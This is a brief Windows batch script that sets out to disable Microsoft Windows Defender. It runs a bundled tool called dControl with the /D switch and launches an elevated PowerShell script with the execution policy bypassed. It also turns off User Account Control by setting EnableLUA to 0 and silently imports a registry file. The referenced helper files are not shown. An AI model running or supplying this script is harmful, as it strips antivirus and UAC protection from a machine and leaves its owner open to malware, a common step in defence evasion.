@ECHO Disabling Microsoft Windows Defender!
START %~dp0dControl\dControl.exe /D
Powershell.exe -Command "& {Start-Process Powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File DEF.ps1' -Verb RunAs}"
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
regedit /s DEF.reg

EXIT